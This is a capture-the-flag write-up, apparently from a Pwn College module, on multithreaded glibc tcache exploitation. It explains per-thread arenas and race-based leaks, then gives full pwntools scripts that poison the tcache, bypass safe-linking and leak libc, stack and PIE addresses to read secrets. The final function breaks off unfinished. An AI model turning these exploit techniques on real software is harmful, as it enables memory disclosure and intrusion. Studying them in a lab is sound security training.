---
layout: post
title:  "Pwn College - Multithreaded Tcache Exploitation"
date:   2024-05-21 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

## Background

### Heap Information Disclosure Via Races

For a single-threaded application, in order to exploit the heap, for example using a tcache poisoning (overwriting freed chunk `next`), a tcache pointer leak was sufficient to resolve any heap address. \
However, for the multithreaded scenario, this is no longer the case. There are actually multiple heaps, one for every thread, each having its own associated arena. This means that **the leaks will be pointers to the specific thread's heap**. This means that the addresses received by `malloc` are different for every thread, even in case of the same ordering. \
The following POC demonstrates this:

```c
void *thread_main(void *x) {
    printf("%p\n", malloc(1024));
    pthread_exit(0);
}

int main(){
    printf("%p\n", malloc(1024));
    pthread_t t1, t2, t3;
    pthread_create(&t1, NULL, thread_main, NULL);
    pthread_create(&t2, NULL, thread_main, NULL);
    pthread_create(&t3, NULL, thread_main, NULL);
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    pthread_join(t3, NULL);
}
```

Upon running this program, similar output would be printed:

```bash
0x4052a0
0x7ffff0000b70
0x7fffe8000b70
0x7fffe8000f80

pwndbg> arenas
arena type    arena address    heap address       map start         map end    perm    size    offset              file
--------------  ---------------  --------------  --------------  --------------  ------  ------  --------  ----------------
    main_arena   0x7ffff7faeac0        0x405000        0x405000        0x426000    rw-p   21000         0            [heap]
non-main arena   0x7fffe8000030  0x7fffe80008d0  0x7fffe8000000  0x7fffe8021000    rw-p   21000         0  [anon_7fffe8000]
non-main arena   0x7ffff0000030  0x7fffef8008d0  0x7fffef800000  0x7ffff0021000    rw-p  821000         0  [anon_7fffef800]
```

Indeed, we can see the main thread have performed allocations from its main heap, resulting in the "regular" address space we are familiar with of the heap. \
However, for non-main heaps, allocations were from different memory regions (due to `mmap`), right past the heap and before libc:

```bash
0x404000           0x405000 rw-p     1000   3000 /home/hacker/test                                                                                                                                                                                       
          0x405000           0x426000 rw-p    21000      0 [heap]                                                                                                                                                                                                  
    0x7fffe8000000     0x7fffe8021000 rw-p    21000      0 [anon_7fffe8000]
    0x7fffe8021000     0x7fffec000000 ---p  3fdf000      0 [anon_7fffe8021]
    0x7fffef7ff000     0x7fffef800000 ---p     1000      0 [anon_7fffef7ff]
    0x7fffef800000     0x7ffff0021000 rw-p   821000      0 [anon_7fffef800]                                                                                                                                                                                        
    0x7ffff0021000     0x7ffff4000000 ---p  3fdf000      0 [anon_7ffff0021]                                                                                                                                                                                        
    0x7ffff6da6000     0x7ffff6da7000 ---p     1000      0 [anon_7ffff6da6]                                                                                                                                                                                        
    0x7ffff6da7000     0x7ffff75a7000 rw-p   800000      0 [anon_7ffff6da7]
```

Interestingly, after every non-main heap pages, there is a large chunk of memory, in which the heap may expand to, in case it is needed. This is where the thread's stack is being allocated from. Also, this means that every thread for this libc version may have an heap + stack regions of up to `0x4000000` bytes. \
In addition, this region is mapped without any permission bits. This denotes that these pages are saved to be serving allocations requests, of either stack or the heap. Moreover, there are guard pages, right before every arena start. They defeat exploitation of linear heap overflows in case of crossing between thread's arenas. \
However, notice that there is a constant pages offset between the last allocated heap and a loaded library:

```bash
0x7fffef800000     0x7ffff0021000 rw-p   821000      0 [anon_7fffef800]                                                                                                                                                                                        
    0x7ffff0021000     0x7ffff4000000 ---p  3fdf000      0 [anon_7ffff0021]                                                                                                                                                                                        
    0x7ffff75a7000     0x7ffff75ab000 r--p     4000      0 /nix/store/nda0h04bakn2damsd06vkscwi5ds4qjd-xgcc-13.2.0-libgcc/lib/libgcc_s.so.1  
    0x7ffff75ab000     0x7ffff75c6000 r-xp    1b000   4000 /nix/store/nda0h04bakn2damsd06vkscwi5ds4qjd-xgcc-13.2.0-libgcc/lib/libgcc_s.so.1
    0x7ffff75c6000     0x7ffff75ca000 r--p     4000  1f000 /nix/store/nda0h04bakn2damsd06vkscwi5ds4qjd-xgcc-13.2.0-libgcc/lib/libgcc_s.so.1
    0x7ffff75ca000     0x7ffff75cb000 r--p     1000  22000 /nix/store/nda0h04bakn2damsd06vkscwi5ds4qjd-xgcc-13.2.0-libgcc/lib/libgcc_s.so.1
    0x7ffff75cb000     0x7ffff75cc000 rw-p     1000  23000 /nix/store/nda0h04bakn2damsd06vkscwi5ds4qjd-xgcc-13.2.0-libgcc/lib/libgcc_s.so.1
```

Since this high-address heap is actually the heap of the **FIRST** born thread (as new `mmap` calls would be made towards lower addresses), we'd usually like to perform the exploit from the first generated thread, in case it is possible. That would mean we would be able to bypass the pages randomization between the thread's arenas. \
Notice, howoever, that the adjacent library may not always be `libc` (as in the example). This is due to `ld` and `libc` being early `mmap`ed libraries. However, unlike the tcache heaps, the libaries offsets are constant :)

Notice another interesting behavior here - while 2 of the allocations had the exact same LSBs, which is expected as each thread have its own heap, the last one did not. In particular, it seems like its chunk was allocated from the previous thread's heap! This is due to the second thread terminating and reclaimed before the third thread, hence the second thread's heap was reused by the third. This is verified, as we can see only 2 non-main arenas were generated. 

In addition, for the main heap, we can see its arena resides **within a libc memory region**:

```bash
0x7ffff7fae000     0x7ffff7fb0000 rw-p     2000 1dd000 /nix/store/dbcw19dshdwnxdv5q2g6wldj6syyvq7l-glibc-2.39-52/lib/libc.so.6
```

This means that upon achieving a libc leak, we can navigate towards the arena address of the main heap! \
However, for all non-main heaps, their corresponding arenas were allocated within the start of the heap itself.  

#### MT Tricks

Recall `printf`. A naive implementation of it would be something as follows:

```c
int naive_printf(const char *str)
{
    int length = strlen(str);
    write(1, str, length);
}
```

However, in case there's no locking being used, this function is vulnerable to MT, as other thread-2 may shrunk `str`, right between thread-1 `length` calculation and its `write` to stdout. \
The interesting part is, **THAT IS THE IMPLEMENTATION OF PRINTF** (aside from parsing format string tokens..). This means that by simply having a MT program with a `printf` call of some memory address that is shared among threads, we can obtain leak (for example, if the other thread `free`s that address). \
Moreover, because `write` is a syscall while `strlen` is a library call, this race have good odds of winning!

### Memory Forensics

Notice that sometimes we would have a thread's arena leak, and we'd like a libc leak. \
While the `main_arena` resides within a constant offset within libc (hence resolving it would acquire us reliable libc leak), other arenas do not - as there are random amount of pages being allocated between libc mappings and the various arenas. \
However, usually that number of pages is very low (max 2 bytes) - and can be easily brute-forceable. 
This means that we can actually turn any thread's arena leak into a libc leak (which translates to stack leak via `environ`). \
In particular, notice that for memory regions allocated by `mmap`, there's usually some small amount of pages boundary in-between. These are all brute-force able relatively easily. 

Moreover, the following [great article][memory-leaks] contains great region-leaking techniques:

1. **PIE program addr -> libc addr**: easy, by reading a GOT entry

2. **Stack addr -> PIE addr**: easy, just read some return addr

3. **Stack addr-> libc addr**: easy, just read garbage at the stack. libc addr WILL be there. 

4. **Main heap addr -> libc addr**: pointers to libc within the heap

5. **Thread heap addr -> libc addr**: pointers to `main_arena`

6. **libc addr -> heaps addr (both main and thread's)**: pointers in bins within `main_arena`

7. **(Very cool) libc addr -> stack addr**: read symbols `environ` or `__libc_argv`

8. **(Insanely cool) libc addr -> PIE program addr**: first leak an ld address, which is usually constant offset from libc. Otherwise, read libc's `_dl_runtime_resolve` GOT entry, which is an ld addr. Then read `_dl_rtld_libname->name`, which holds pointer to the `.interp` section of the main binary. 

9. **PIE addr -> any library addr**: Read `link_map`, and traverse the loaded `.so` linked list. 

There's also the option to retrieve stack addr out of non-main thread's heap, as they are usually differ by some small amount of pages and may be retrieved by 16-bit brute-force. 
However, all of the above together yields a full pointers path between all of the loaded program's memory regions, in a reliable way (no need to brute force anything). I find this extremely cool. 

### Arbitrary R / W

Some gotchas including a positive value for tcachebin `count`. In that case, allocations would be made, racing with our exploit. We'd like to make sure the `count` of the bin is set to `0` after we've allocated a chunk at the arbitrary address. That way, other `malloc` calls would be performed off completely different memory regions. Another way to bypass this, is to create a new thread for each attempt. Because the tcache is a per-thread resource, the tcache metadata would be re-initialized for each invocation. \
Another gotcha is not paying attention to any side effects caused by the R / W implementations. For example, if the arbitrary read imlementation internally `malloc`'s a target addres via tcache poisioning, it actually nullifies the second qword. \
Another gotcha - It is pretty common we'd have to avoid whitespace characters while developing the exploit. \
One way to get adequate gadgets:

```python
import string 
# There are total of 6 whitespace characters. 
# We can also just avoid 0x09-0x0e, 0x20
libc_rop = ROP(libc, badchars=string.whitespace)
libc_rop.call('exit', [42])
write(libc_rop.chain())
```

Lastly, for complex systems we sometimes need an fd's value, while we cannot read not predict it deterministically. A possible approach is to `close(fd)`, so that the next call to `open` would be our known closed `fd`. 

## Challenge 1

Our goal is to forge an arbitrary read primitive, under multithreaded environment. \
My idea is to use tcache poisioning for the `next` ptr of a free chunk. However, can only trigger a UAF by winning a race, as there's no vuln in the single-threaded application. 

Recall our goal ordering (all within thread-1):

```bash
malloc 0
malloc 1
free 1
free 0
printf 0 
```

However, notice that theres a global `stored` array, which tracks whether or not a chunk is free. This means we would have to perform a race between the second `free`, that would be done by thread-1, and the `printf`, that would be done by thread-2. \
Our wanted ordering:

```bash
free(0)  # T1
(printf) is stored[0] == 1? true # T2
stored[0] = 0  # T1
printf(0)  # T2
```

Where the actual atomic operation needed, is the check of `stored[0] == 1`. 

A key observation I've had, was when I wrote the `write_nextptr` primitive. Originally, it was something as follows (`fork` is used as python's threads are a lie):

```python
if os.fork() == 0:
    for _ in range(iterations):
        malloc(r1, 0)
        malloc(r1, 1)
        free(r1, 1)
        free(r1, 0)
    os.kill(os.getpid(), signal.SIGKILL.value)
else:
    for _ in range(iterations):
        new_next = p64(addr ^ heap_key)
        scanf(r2, 0, new_next)
```

I've done so, in order to make a scenario where the second `free` is raced with the other thread's `scanf`, hence the `next` is successfully overwritten. \
However, there's one VERY bad problem with this approach - because there are actually 2 allocations, we would implicitly not only overwrite the `next` ptr, but also **ALLOCATE** it. \
A clever trick we can do in order to solve this issue, is to make sure we only make one allocation within thread-1, removing `malloc(1), free(1)` requests. But if thats the case, how would we initialize a `next` ptr within `slot[0]` chunk? Simple - before starting the exploit, run a dedicated method, `warm_tcache`, which would do the following:

```python
def warm_tcache(p):
    malloc(p, 0)
    malloc(p, 1)
    free(p, 1)
    free(p, 0)
```

That would make sure that the state in which the exploit starts is a tcache of `count = 2`, having a valid `next` ptr for the first allocation. \
Since there's no time frame in which two allocations are made, we are OK - and our goal overwritten `next` ptr wouldn't be implicitly allocated. \
Moreover, another optimization is to instead of sending a single `scanf` via every iteration, to send bunch of them at once. 

I've made some generic methods for arbitrary read and write, in order to solve the whole module easily. 

```python
#!/bin/python

from glob import glob
from dataclasses import dataclass
from subprocess import check_output
from pwn import *
import os, sys
import struct
import time
import shutil
import binascii
import signal
import array
import textwrap
import string
import logging
BINARY = glob('/challenge/baby*')[0]
LIBC = '/challenge/lib/libc.so.6'
GDB_SCRIPT= '''
set follow-fork-mode parent

c
'''


context.arch = 'amd64'
libc = ELF(LIBC)
libc_rop = ROP(LIBC, badchars=string.whitespace)


def malloc(p, index):
    log.info(f'malloc index: {index}')
    buf = b'malloc '
    buf += str(index).encode()
    p.sendline(buf)
    
def free(p, index):
    log.info(f'free index: {index}')
    buf = b'free '
    buf += str(index).encode()
    p.sendline(buf)

def scanf(p, index, data, batch=1):
    log.info(f'scanf index: {index}')
    buf = b'scanf '
    buf += str(index).encode() + b' '
    buf += data + b' '
    buf *= batch
    p.sendline(buf)

def printf(p, index, batch=1):
    log.info(f'printf index: {index}')
    buf = b'printf '
    buf += str(index).encode() + b' '
    buf *= batch
    p.sendline(buf)
    p.recvuntil(b'MESSAGE: ')
    message = p.readline()[:-1]
    return message

def send_flag(p, secret):
    p.sendline(b'send_flag')
    p.recvuntil(b'Secret: ')
    p.sendline(secret)
    for _ in range(3):
        print(p.readline())

def allocate_at_addr(r1, r2, key, index, addr, debug=False):
    '''
    Allocates chunk at specified addr, taking safe-linking into account. 
    The result is saved in [index + 1].
    SIDE EFFECT: Corrupts slots [index], and nullifies [addr + 8]. 
    '''
    assert((addr & 0xf) == 0)
    for char in string.whitespace:
        if char.encode() in p64(addr):
            raise Exception(f'addr: {hex(addr)} contains bad character: "{char}"')

    write_nextptr(r1, r2, key, addr, index, debug)
    # Allocate chunk right on the addr, store at [index + 1], and never free it (as not all addresses are free-able)
    malloc(r1, index + 2)
    malloc(r1, index + 1) 

    return

def mangle(pos, ptr):
    return (pos >> 12) ^ ptr

def demangle_ptr(mangled):
    o = mangle(mangled, mangled)
    ptr = (o >> 24) ^ o
    key = ptr ^ mangled
    # Perform semi-brute force, to generalize demangling of up to 0x10 pages difference between pos and ptr. 
    for i in range(0x10):
        candid_key = key - i
        candid_ptr = mangled ^ candid_key
        if ((candid_ptr & 0xf) == 0):
            return candid_ptr, candid_key

    raise('demangling failed!')

def read_nextptr(r1, r2):
    leaks = list()
    iterations = 20000
    if os.fork() == 0:
        for _ in range(iterations):
            # Because we've warmed up, the tcache has filled, and no need for 2 allocations
            malloc(r1, 0)
            free(r1, 0)
        os.kill(os.getpid(), signal.SIGKILL.value)
    else:
        for _ in range(iterations):
            data = printf(r2, 0)
            leaks.append(data)
    os.wait()

    leaks = set(leaks)
    for leak in leaks:
        if (len(leak) == 6) and (leak[-1] == 0x7f):
            mangled_heap_ptr = leak + b'\x00' * 2
            break
    
    mangled_heap_ptr = u64(mangled_heap_ptr)
    return mangled_heap_ptr

def write_nextptr(r1, r2, key, addr, index, debug=False):
    iterations = 1000
    if os.fork() == 0:
        # Child
        for _ in range(iterations):
            malloc_free_command = buf = b'malloc ' + str(index).encode() + b' free ' + str(index).encode() + b' '
            malloc_free_command *= 100
            r1.sendline(malloc_free_command)
        os.kill(os.getpid(), signal.SIGKILL.value)
    else:
        # Parent
        for _ in range(iterations):
            new_next = p64(addr ^ key)
            scanf(r2, index, new_next, 100)  # Can optimize this, do not re-gen string every iteration
    os.wait()

    return


def arbitrary_read(r1, r2, key, addr, index, paddings_size=0, debug=False):
    '''
    Internally, corrupts slot [index]
    Has a side effect of nullifying some bytes near the leak, as a malloc chunk is being allocated and chunk->key = NULL. 
    Therefore, choose addr wisely
    '''
    read_addr = addr - paddings_size
    # Allocate the chunk within a fresh slot, index + 1. It would never be freed from there.
    allocate_at_addr(r1, r2, key, index, read_addr, debug)

    # Trick - for non aligned reads, allocate a chunk at [addr - paddings_size], and fill it with paddings_size crap bytes. 
    if paddings_size:
        pad_bytes = b'A' * paddings_size
        scanf(r1, index + 1, pad_bytes)
    buf = printf(r1, index + 1)
    print(f'Obtained read buf: {buf}')
    # Restore state, now [index + 2] -> [index + 3] within the tcache
    # At this point, the tcache is empty. Add another allocation and free it. 
    # That way the tcache would have 2 available chunks, and the tcache invariant holds. 
    malloc(r1, index + 3)
    free(r1, index + 3)
    free(r1, index + 2)
    
    return buf


def arbitrary_write(p, heap_key, addr, values):
    '''
    Internally, corrupts slots 0, 1, 2. 
    Has a side effect of nullifying some bytes near the allocation, as a malloc chunk is being allocated and chunk->key = NULL. 
    Therefore, choose addr wisely
    '''
    lsb_nibble = addr & 0xf
    assert(lsb_nibble == 0 or lsb_nibble == 8)
    if lsb_nibble == 8:
        paddings_size = 0x8     
    elif lsb_nibble == 0:
        paddings_size = 0x0

    values = b'A' * paddings_size + values  # Since the allocation may be 8 bytes before the goal address, we have to supply extra padding
    chunk_size = len(values) + (0x10 - (len(values) % 0x10)) + 8  # Make sure the allocated chunk is large enough, and contains nibble of 0x8
    allocate_at_addr(p, addr - paddings_size, 0, chunk_size, heap_key)
    safe_read(p, 0, values)
    
    return

def warm_tcache(p, index=0):
    malloc(p, index)
    malloc(p, index + 1)
    free(p, index + 1)
    free(p, index)

def main():    
    debug = False
    if debug:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        p = process(BINARY)
    time.sleep(3)
    log.setLevel(logging.WARNING)

    r1 = remote('localhost', 1337)
    r2 = remote('localhost', 1337)
    warm_tcache(r1, index=0)
    allocation_size = 0x410

    heap_next_to_heap_base_offset = 0x1340
    main_arena_heap_offset = 0x8a0
    # Phase 1 - leak a mangled heap pointer
    mangled_heap_next = read_nextptr(r1, r2)
    print(f'mangled_heap_next: {hex(mangled_heap_next)}')
    heap_next, heap_key = demangle_ptr(mangled_heap_next)
    heap_base = heap_next - heap_next_to_heap_base_offset
    assert(heap_base & 0xfff == 0)
    print(f'heap_base: {hex(heap_base)} heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
    main_arena_heap_addr = heap_base + main_arena_heap_offset
    print(f'main_arena_heap_addr: {hex(main_arena_heap_addr)}')

    # Phase 2 - leak libc address using the allocated stream
    log.info("Reading libc address")
    main_arena_libc_offset = 0xc80
    environ_libc_offset = 0x8200
    main_arena_libc_addr = arbitrary_read(r1, r2, heap_key, addr=main_arena_heap_addr, index=0)
    assert(len(main_arena_libc_addr) == 6)
    main_arena_libc_addr = u64(main_arena_libc_addr + 2 * b'\x00')
    libc_base = main_arena_libc_addr - main_arena_libc_offset    
    environ_libc = libc_base + environ_libc_offset
    chmod_addr = libc_base + libc.symbols['chmod']
    pop_rdi_ret = libc_base + libc_rop.rdi.address
    pop_rsi_ret = libc_base + libc_rop.rsi.address
    assert(libc_base & 0xfff == 0)
    print(f'libc_base: {hex(libc_base)} environ_libc: {hex(environ_libc)} chmod_addr: {hex(chmod_addr)}')
    
    # Phase 3 - leak stack address
    # key: (heap_next - allocation_size) >> 12
    # Notice: because of the smart tcache invariant, we dont have to track allocations.
    # The reason is that all allocations are being made from the same, the first, chunk :)
    log.info("Reading stack address")
    environ_stack_addr = arbitrary_read(r1, r2, heap_key, addr=environ_libc, index=2)  
    assert(len(environ_stack_addr) == 6)
    environ_stack_addr = u64(environ_stack_addr + b'\x00' * 2)
    print(f'environ_stack_addr: {hex(environ_stack_addr)}')
    
    # Phase 4 - read program .bss
    secret_addr = 0x4054c0
    print(f'Leaking secret addr from: {hex(secret_addr)}')
    secret_leak = arbitrary_read(r1, r2, heap_key, addr=secret_addr, index=4)
    print(f'secret: {secret_leak}')

    # Win
    send_flag(r1, secret_leak)

    p.interactive()


if __name__ == '__main__':
    main()
```

## Challenge 2 

Now that I have generic R / W primitives, all of these challenges are very easy and repetitive. The whole module was challenge 1, lol. \
Now the secret is loaded to the thread's heap.

```python
def exploit():
    p = process(BINARY)
    time.sleep(3)
    log.setLevel(logging.WARNING)
    r1 = remote('localhost', 1337)
    r2 = remote('localhost', 1337)
    warm_tcache(r1, index=0)
    allocation_size = 0x410

    heap_next_to_heap_base_offset = 0x1380
    main_arena_heap_offset = 0x8a0
    # Phase 1 - leak a mangled heap pointer
    mangled_heap_next = read_nextptr(r1, r2)
    print(f'mangled_heap_next: {hex(mangled_heap_next)}')
    heap_next, heap_key = demangle_ptr(mangled_heap_next)
    r1_heap_base = heap_next - heap_next_to_heap_base_offset
    assert(r1_heap_base & 0xfff == 0)
    print(f'r1_heap_base: {hex(r1_heap_base)} heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
    main_arena_r1_heap_addr = r1_heap_base + main_arena_heap_offset
    print(f'main_arena_r1_heap_addr: {hex(main_arena_r1_heap_addr)}')

    # Phase 4 - read thread's heap
    secret_addr = r1_heap_base + 0xf50
    print(f'Leaking secret addr from: {hex(secret_addr)}')
    secret_leak = arbitrary_read(r1, r2, heap_key, addr=secret_addr, index=4)
    print(f'secret: {secret_leak}')

    # Win
    send_flag(r1, secret_leak)
    p.interactive()
```

## Challenge 3

Now our goal is to read off the thread's stack. \
This one is abit tricky. While having a leak of the main thread's stack is relatively easy (via `environ` for example), leaking a non-main thread stack isn't forward. 

There are two approaches: \
The first and obvious a leak to that memory region elsewhere, for example search a pointer from the thread's heap to its stack:

```bash
pwndbg> p2p anon_7f5ad4000 anon_7f5adc705
00:0000│  0x7f5ad4000c58 —▸ 0x7f5adcf04640 ◂— 0x7f5adcf04640
```

The second approach is to notice the fact that since we're exploiting the first generated thread, its memory mappings are being allocated adjacent to libc mappings:

```bash
pwndbg> vmmap 0x7f5adcf03850
0x7f5adc704000     0x7f5adc705000 ---p     1000      0 [anon_7f5adc704]
0x7f5adc705000     0x7f5adcf08000 rw-p   803000      0 [anon_7f5adc705]
0x7f5adcf08000     0x7f5adcf30000 r--p    28000      0 /challenge/lib/libc.so.6
```

This means that `libc` leak would resolve to the first thread's stack leak! \
Personally I prefer the first approach (although the second is cooler), as the distance between the leaked thread-stack leak and the goal secret pointer is considerabily lower than the libc leak. This means that the probability of stuff being messed up within allocations in between is lower, making the exploit more reliable. \
However, notice that the stack address within the heap is very problematic - it isn't aligned, and it always contains a bad character `\x0c` that would truncate `scanf` operation. 

After doing some research, I've found there are actually multiple other pointers towards the thread's stack - within the main heap and the main stack!

```bash
pwndbg> p2p heap anon_7f80725a4
00:0000│  0x55b07b6e92e0 —▸ 0x7f8072da3630 —▸ 0x7f806c000b70 ◂— 0xfbad248b
00:0000│  0x55b07b6e92f0 —▸ 0x7f8072da35a0 —▸ 0x7f8072fc1580 —▸ 0x7f8072fbd820 —▸ 0x7f8072f811d7 ◂— ...
pwndbg> p2p stack anon_7f80725a4
00:0000│  0x7ffc7e0b4cd8 —▸ 0x7f8072da4740 ◂— 0x7f8072da4740
00:0000│  0x7ffc7e0b4e60 —▸ 0x7f8072da3640 ◂— 0x7f8072da3640
00:0000│  0x7ffc7e0b4e80 —▸ 0x7f8072da3950 ◂— 0
00:0000│  0x7ffc7e0b4ea0 —▸ 0x7f8072da3640 ◂— 0x7f8072da3640
```

Therefore, I've used the main stack in order to leak address of the thread-specific stack:

```python
def exploit():
    p = process(BINARY)
    time.sleep(3)
    log.setLevel(logging.WARNING)
    r1 = remote('localhost', 1337)
    r2 = remote('localhost', 1337)
    warm_tcache(r1, index=0)
    allocation_size = 0x410

    # Phase 1 - leak a mangled heap pointer
    heap_next_to_heap_base_offset = 0x1340
    main_arena_heap_offset = 0x8a0
    mangled_heap_next = read_nextptr(r1, r2)
    print(f'mangled_heap_next: {hex(mangled_heap_next)}')
    heap_next, heap_key = demangle_ptr(mangled_heap_next)
    r1_heap_base = heap_next - heap_next_to_heap_base_offset
    print(f'heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
    assert(r1_heap_base & 0xfff == 0)
    print(f'r1_heap_base: {hex(r1_heap_base)}')
    main_arena_r1_heap_addr = r1_heap_base + main_arena_heap_offset
    print(f'main_arena_r1_heap_addr: {hex(main_arena_r1_heap_addr)}')
    
    # Phase 2 - leak libc address using the allocated stream
    log.info("Reading libc address")
    main_arena_libc_offset = 0xc80
    environ_libc_offset = 0x8200
    main_arena_libc_addr = arbitrary_read(r1, r2, heap_key, addr=main_arena_r1_heap_addr, index=0)
    assert(len(main_arena_libc_addr) == 6)
    main_arena_libc_addr = u64(main_arena_libc_addr + 2 * b'\x00')
    print(f'main_arena_libc_addr: {hex(main_arena_libc_addr)}')
    libc_base = main_arena_libc_addr - main_arena_libc_offset    
    environ_libc = libc_base + environ_libc_offset
    chmod_addr = libc_base + libc.symbols['chmod']
    pop_rdi_ret = libc_base + libc_rop.rdi.address
    pop_rsi_ret = libc_base + libc_rop.rsi.address
    assert(libc_base & 0xfff == 0)
    print(f'libc_base: {hex(libc_base)} environ_libc: {hex(environ_libc)} chmod_addr: {hex(chmod_addr)}')

    # Phase 3 - leak stack address
    # key: (heap_next - allocation_size) >> 12
    # Notice: because of the smart tcache invariant, we dont have to track allocations.
    # The reason is that all allocations are being made from the same, the first, chunk :)
    log.info("Reading stack address")
    environ_stack_addr = arbitrary_read(r1, r2, heap_key, addr=environ_libc, index=2)  
    assert(len(environ_stack_addr) == 6)
    environ_stack_addr = u64(environ_stack_addr + b'\x00' * 2)
    print(f'environ_stack_addr: {hex(environ_stack_addr)}')
    
    # Read thread stack using a pointer resides within the main thread's stack
    thread_stack_to_environ_offset = 0x718
    thread_stack_leak_main_stack_addr = environ_stack_addr - thread_stack_to_environ_offset
    print(f'thread_stack_leak_main_stack_addr: {hex(thread_stack_leak_main_stack_addr)}')
    thread_stack_leak = arbitrary_read(r1, r2, heap_key, addr=thread_stack_leak_main_stack_addr, index=4)
    assert(len(thread_stack_leak) == 6)
    thread_stack_leak = u64(thread_stack_leak + 2 * b'\x00')
    secret_to_stack_leak_offset = 0xdf0
    secret_addr = thread_stack_leak - secret_to_stack_leak_offset
    print(f'thread_stack_leak: {hex(thread_stack_leak)} secret_addr: {hex(secret_addr)}')

    # Read the secret off the thread's stack
    secret = arbitrary_read(r1, r2, heap_key, addr=secret_addr, index=6)
    print(f'secret: {secret}')

    # Win
    send_flag(r1, secret)
    p.interactive()
```

Notice the route we've taken:

```bash
thread_heap -> libc_addr
libc_addr -> main_stack
main_stack -> thread_stack
```

Although there was direct pointer between the thread's heap towards the thread's stack, however its address contained white characters that couldn't escape. \
The "filler" trick, where we perform allocation before our goal address, and write junk bytes before the target address, should work. 

## Challenge 4

Our goal is to retrieve PIE base addr. \
While we can do this via stack leakage for sure, I'd always prefer retrieving it from library memory regions instead, as they are less prone to changes during runtime. \
There's a cool trick that allows leaking the PIE address off libc, by reading `_dl_rtld_libname->name`, which holds a pointer to the `interp` section of the main binary:

```bash
pwndbg> p2p /challenge/lib/ld-linux-x86-64.so.2 /challenge/babyprime_level4.0
00:0000│  0x7f02a91b9a80 —▸ 0x564789f09000 ◂— 0x10102464c457f
```

An important gotcha, is the fact that most of the `ld` mappings are actually read-only. This means we won't be able to allocate a tcache chunk (as it would write `p->key = NULL`) there. 

```python
def exploit():
    p = process(BINARY)
    time.sleep(3)
    log.setLevel(logging.WARNING)
    r1 = remote('localhost', 1337)
    r2 = remote('localhost', 1337)
    warm_tcache(r1, index=0)
    allocation_size = 0x410

    # Leak a mangled heap pointer
    heap_next_to_heap_base_offset = 0x1340
    main_arena_heap_offset = 0x8a0
    mangled_heap_next = read_nextptr(r1, r2)
    print(f'mangled_heap_next: {hex(mangled_heap_next)}')
    heap_next, heap_key = demangle_ptr(mangled_heap_next)
    r1_heap_base = heap_next - heap_next_to_heap_base_offset
    print(f'heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
    assert(r1_heap_base & 0xfff == 0)
    print(f'r1_heap_base: {hex(r1_heap_base)}')
    main_arena_r1_heap_addr = r1_heap_base + main_arena_heap_offset
    print(f'main_arena_r1_heap_addr: {hex(main_arena_r1_heap_addr)}')
    
    # Leak libc address using the thread's heap
    log.info("Reading libc address")
    main_arena_libc_offset = 0x219c80
    main_arena_libc_addr = arbitrary_read(r1, r2, heap_key, addr=main_arena_r1_heap_addr, index=0)
    assert(len(main_arena_libc_addr) == 6)
    main_arena_libc_addr = u64(main_arena_libc_addr + 2 * b'\x00')
    print(f'main_arena_libc_addr: {hex(main_arena_libc_addr)}')
    libc_base = main_arena_libc_addr - main_arena_libc_offset    
    environ_libc = libc_base + libc.symbols['environ']
    chmod_addr = libc_base + libc.symbols['chmod']
    pop_rdi_ret = libc_base + libc_rop.rdi.address
    pop_rsi_ret = libc_base + libc_rop.rsi.address
    assert(libc_base & 0xfff == 0)
    print(f'libc_base: {hex(libc_base)} environ_libc: {hex(environ_libc)} chmod_addr: {hex(chmod_addr)}')

    # Leak PIE base address via libc->ld
    libc_to_ld_offset = 0x22a000
    ld_base = libc_base + libc_to_ld_offset
    print(f'ld_base: {hex(ld_base)}')
    dl_pie_leak_addr = ld_base + 0x3b2f0
    pie_leak_offset = 0x4ca8
    print(f'dl_pie_leak_addr: {hex(dl_pie_leak_addr)}')
    pie_base = arbitrary_read(r1, r2, heap_key, addr=dl_pie_leak_addr, index=2)
    assert(len(pie_base) == 6)
    pie_base = u64(pie_base + 2 * b'\x00') - pie_leak_offset
    print(f'pie_base: {hex(pie_base)}')
    assert((pie_base & 0xfff) == 0)

    # Read the secret
    secret_addr = pie_base + 0x5380
    secret = arbitrary_read(r1, r2, heap_key, addr=secret_addr, index=6)
    print(f'secret: {secret}')

    # Win
    send_flag(r1, secret)
    p.interactive()
```

## Challenge 5

Simply reading `environ` offset.

```python
def exploit():
    p = process(BINARY)
    time.sleep(3)
    log.setLevel(logging.WARNING)
    r1 = remote('localhost', 1337)
    r2 = remote('localhost', 1337)
    warm_tcache(r1, index=0)
    allocation_size = 0x410

    # Leak a mangled heap pointer
    heap_next_to_heap_base_offset = 0x1340
    main_arena_heap_offset = 0x8a0
    mangled_heap_next = read_nextptr(r1, r2)
    print(f'mangled_heap_next: {hex(mangled_heap_next)}')
    heap_next, heap_key = demangle_ptr(mangled_heap_next)
    r1_heap_base = heap_next - heap_next_to_heap_base_offset
    print(f'heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
    assert(r1_heap_base & 0xfff == 0)
    print(f'r1_heap_base: {hex(r1_heap_base)}')
    main_arena_r1_heap_addr = r1_heap_base + main_arena_heap_offset
    print(f'main_arena_r1_heap_addr: {hex(main_arena_r1_heap_addr)}')

    # Leak libc address using the thread's heap
    log.info("Reading libc address")
    main_arena_libc_offset = 0x219c80
    main_arena_libc_addr = arbitrary_read(r1, r2, heap_key, addr=main_arena_r1_heap_addr, index=0)
    assert(len(main_arena_libc_addr) == 6)
    main_arena_libc_addr = u64(main_arena_libc_addr + 2 * b'\x00')
    print(f'main_arena_libc_addr: {hex(main_arena_libc_addr)}')
    libc_base = main_arena_libc_addr - main_arena_libc_offset    
    environ_libc = libc_base + libc.symbols['environ']
    chmod_addr = libc_base + libc.symbols['chmod']
    pop_rdi_ret = libc_base + libc_rop.rdi.address
    pop_rsi_ret = libc_base + libc_rop.rsi.address
    assert(libc_base & 0xfff == 0)
    print(f'libc_base: {hex(libc_base)} environ_libc: {hex(environ_libc)} chmod_addr: {hex(chmod_addr)}')

    # Leak stack address via libc
    log.info("Reading stack address")
    environ_stack_addr = arbitrary_read(r1, r2, heap_key, addr=environ_libc, index=4)  
    assert(len(environ_stack_addr) == 6)
    environ_stack_addr = u64(environ_stack_addr + b'\x00' * 2)
    print(f'environ_stack_addr: {hex(environ_stack_addr)}')

    # Read the secret
